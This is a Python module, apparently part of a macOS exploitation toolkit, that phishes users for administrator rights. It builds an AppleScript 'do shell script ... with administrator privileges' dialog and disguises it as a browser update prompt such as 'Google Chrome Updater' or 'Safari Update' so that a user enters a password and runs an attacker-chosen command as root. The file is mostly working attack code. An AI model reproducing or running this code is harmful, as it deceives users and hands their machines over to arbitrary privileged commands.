"""phishes for sudo with AppleScript"""
from .general import DEFAULT_COMMAND, default_browser, osascript, random_string

try:
    input = raw_input
except NameError:
    pass

__cve__ = ""
__credits__ = "thehappydinoa"

BROWSERS = {
    "com.google.chrome": "Google Chrome Updater",
    "org.mozilla.firefox": "Firefox Updater",
    "com.apple.safari": "Safari Update"
}


def admin_prompt(app=None, prompt="System Update", command="echo hello"):
    """prompts with administrator privileges"""
    rand = random_string()
    if app:
        payload = """osascript <<END
          set command to "{command}; echo {success}"
          tell app "{app}" to activate
          return tell app "{app}" to do shell script command with prompt "{prompt}" with administrator privileges
        END""".format(app=app, prompt=prompt, command=command, success=rand)
    else:
        payload = """osascript <<END
          set command to "{command}; echo {success}"
          return do shell script command with prompt "{prompt}" with administrator privileges
        END""".format(prompt=prompt, command=command, success=rand)
    print("\nPrompting: " + prompt)
    response = osascript(payload)
    return rand in response


def vulnerable(version):
    """checks vulnerability"""
    return "y" == input("\n[USER INTERACTION] Do you want to try to phish for sudo? (y/N): ")[0].lower()


def run():
    """runs exploit"""
    browser = default_browser()
    if browser and browser in BROWSERS.keys():
        return admin_prompt(prompt=BROWSERS.get(browser), command=DEFAULT_COMMAND)
    return admin_prompt(command=DEFAULT_COMMAND)
